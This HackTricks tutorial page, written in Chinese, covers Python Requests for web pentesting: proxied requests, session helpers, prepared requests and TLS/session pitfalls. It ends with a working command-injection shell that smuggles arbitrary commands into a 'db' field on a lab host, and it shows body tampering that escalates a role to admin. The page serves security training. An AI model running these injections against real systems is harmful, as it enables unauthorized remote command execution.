# Web 请求

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

这些示例使用 Requests 文档中介绍的请求参数、响应属性、多部分文件元组和会话。<sup>[[1]](#references)</sup> `verify=False` 示例会禁用 TLS 证书验证，因此应仅限于受控测试。<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## 用于 payload 控制的 Prepared requests

`PreparedRequest` 会在发送前公开最终 URL、headers 和 encoded body。当必须应用 session cookies 或 authentication 时，使用 `Session.prepare_request()`（而不是 `Request.prepare()`）构建它；当 prepared-flow 还必须遵循环境 proxy/CA 设置时，使用 `merge_environment_settings()` 显式合并这些设置。<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
当 exploit 需要非标准编码，或需要将构造的 payload 与存储在 `response.request` 中的请求进行比较时，这非常有用。它不是 raw-HTTP primitive：Requests 将 headers 存储在不区分大小写的映射中，因此为重复名称赋值会替换之前的值。对于畸形请求行，或 [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md) 所需的不同重复 `Content-Length`/`Transfer-Encoding` 字段，请使用更低级别的 sender。<sup>[[1]](#references)</sup>

## Session 隔离、隐式凭据和 TLS 状态

Session 默认信任环境配置。如果未提供显式 authentication，Requests 可能会从 `.netrc` 获取 Basic 凭据；它还可能从环境变量导入 proxy 配置和 CA bundle 路径。对于获取攻击者控制的 URL 的脚本，请禁用这些隐式输入，并仅显式配置预期的 lab proxy/CA。在 2.32.4 之前的版本中，面对恶意构造的 URL 时，可能会为错误的主机选择 `.netrc` 凭据；如果无法升级，`Session.trust_env = False` 是文档规定的 workaround。<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
将使用 `verify=False` 的会话与要求验证 TLS 的会话分开。在 Requests 2.32.0 之前，最初使用 `verify=False` 打开的连接，可能会被后续指定 `verify=True` 的同源请求重新使用；升级可以修复这个连接池状态问题，但隔离会话也能让 exploit 脚本更容易审计。<sup>[[5]](#references)</sup>

## 可靠的 exploit 循环

Requests 没有默认的 `timeout`。`(connect, read)` timeout 不是整个 wall-clock deadline：其中的 read 部分限制客户端在接收字节之间等待的时长。当目标可以控制 `Location` 时，应禁用自动重定向，然后在发送新请求前验证每一跳；如果启用了重定向，请检查 `response.history`。对于大型或恶意响应，请使用 `stream=True`，以有界大小的 chunks 进行迭代，并通过上下文管理器关闭响应，以便释放连接池中的连接。<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## 利用 RCE 的 Python cmd

该命令循环继承 Python 的 `Cmd`；其 `default` 方法处理无法识别的命令前缀，`cmdloop` 分派输入行，而 `re.DOTALL` 允许提取模式跨越换行符。<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests 开发者接口](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` —— 面向行的命令解释器支持](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` —— 正则表达式操作](https://docs.python.org/3/library/re.html)
- [4] [Requests 存在通过恶意 URL 泄露 `.netrc` 凭据的漏洞](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Requests 的 `Session` 对象在首次使用 `verify=False` 发送请求后不会验证后续请求](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
